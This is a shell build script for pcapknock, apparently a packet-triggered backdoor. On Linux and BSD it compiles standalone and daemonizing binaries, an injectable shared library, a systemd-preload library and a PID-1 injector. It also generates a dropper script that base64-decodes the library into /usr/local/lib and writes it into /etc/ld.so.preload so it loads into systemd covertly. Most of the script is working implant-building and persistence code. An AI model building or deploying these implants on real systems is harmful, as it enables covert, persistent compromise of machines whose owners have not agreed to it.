#!/bin/sh
#
# build.sh
# Build pcapknock for a variety of situations
# By J. Stuart McMurray
# Created 20190324
# Last Modified 20190325

set -e

# Options to pass to the C compiler
COPTS="-Os -Wall --pedantic"
OUTDIR="./built/$(uname -s)"

# Make sure we're in the same directory as the sources
if [ ! -r pcapknock.c ]; then
        echo "Source file pcapknock.c not found.  Sure you're in the right place?" >&2
        exit 1
fi

# Make sure we have an output directory
if [ ! -d "$OUTDIR" ]; then mkdir -p $OUTDIR; fi

# Linux
if [ "Linux" = "$(uname -s)" ]; then
        PCAPDIR=./libpcap-1.9.0/built #Vendored libpcap
        INJDIR=./linux_injector
        DROPPER=$OUTDIR/systemd_dropper.sh
        DROPPERLIB="/usr/local/lib/libpk.so.4"

        # Build a standalone binary for debugging
        cc $COPTS -DDEBUG                         -I$PCAPDIR/include -o "$OUTDIR/pcapknock.standalone.debug"  *.c $PCAPDIR/lib/libpcap.a -lpthread
        # Build a standalone non-daemonizing binary
        cc $COPTS                                 -I$PCAPDIR/include -o "$OUTDIR/pcapknock.standalone"        *.c $PCAPDIR/lib/libpcap.a -lpthread
        # Build a standalone daemonizing binary
        cc $COPTS -DDAEMON                        -I$PCAPDIR/include -o "$OUTDIR/pcapknock.standalone.daemon" *.c $PCAPDIR/lib/libpcap.a -lpthread
        # Build an injectable library
        cc $COPTS -DCONSTRUCTOR                   -I$PCAPDIR/include -o "$OUTDIR/pcapknock.so"                *.c $PCAPDIR/lib/libpcap.a -lpthread -fPIC -shared -fvisibility=hidden
        # Build an preloadable systemd-only library
        cc $COPTS -DCONSTRUCTOR -DPRELOAD_SYSTEMD -I$PCAPDIR/include -o "$OUTDIR/pcapknock.systemd.so"       *.c $PCAPDIR/lib/libpcap.a -lpthread -ldl -fPIC -shared -Wl,--version-script=systemd.version
        # Build an injector
        (cd $OUTDIR; xxd -i pcapknock.so) > $INJDIR/pcapknock.so.c
        cc -DDEBUG $COPTS -I$INJDIR -o $OUTDIR/pcapknock.pid1-injector $INJDIR/*.c -static
        # Build a dropper for the systemd-only library
        echo '#!/bin/sh'                                                                     >$DROPPER
        echo 'set -e'                                                                       >>$DROPPER
        echo "LA=$DROPPERLIB"                                                               >>$DROPPER
        echo 'LB=$LA.$RANDOM'                                                               >>$DROPPER
        echo 'PA=/etc/ld.so.preload'                                                        >>$DROPPER
        echo 'PB=$PA.$RANDOM'                                                               >>$DROPPER
        echo 'if ! which openssl >/dev/null; then echo "OpenSSL not found" >&2; exit 1; fi' >>$DROPPER
        echo 'cat <<_eof | openssl base64 -d >$LB'                                          >>$DROPPER
        openssl base64 -e <$OUTDIR/pcapknock.systemd.so                                     >>$DROPPER
        echo '_eof'                                                                         >>$DROPPER
        echo 'chmod 0755 $LB'                                                               >>$DROPPER
        echo 'echo $LA > $PB'                                                               >>$DROPPER
        echo 'if [ -r $PA ]; then grep -v $LA $PA >> $PB; fi'                               >>$DROPPER
        echo 'mv $LB $LA'                                                                   >>$DROPPER
        echo 'mv $PB $PA'                                                                   >>$DROPPER
        echo 'echo Created files:'                                                          >>$DROPPER
        echo 'ls -l $LA $PA'                                                                >>$DROPPER
        echo 'echo Contents of $PA:'                                                        >>$DROPPER
        echo 'cat $PA'                                                                      >>$DROPPER

# OpenBSD and FreeBSD
elif [ "OpenBSD" = "$(uname -s)" ] || [ "FreeBSD" = "$(uname -s)" ]; then
        # Build a standalone binary for debugging
        cc $COPTS -DDEBUG                  -o "$OUTDIR/pcapknock.standalone.debug"  *.c -lpcap -lpthread
        # Build a standalone non-daemonizing binary
        cc $COPTS                          -o "$OUTDIR/pcapknock.standalone"        *.c -lpcap -lpthread
        # Build a standalone daemonizing binary
        cc $COPTS -DDAEMON                 -o "$OUTDIR/pcapknock.standalone.daemon" *.c -lpcap -lpthread
        # Build an injectable library
        cc $COPTS -DCONSTRUCTOR            -o "$OUTDIR/pcapknock.so"                *.c -lpcap -lpthread -fPIC -shared -fvisibility=hidden
fi

echo "Compiled files are in $OUTDIR:"
ls -lart $OUTDIR
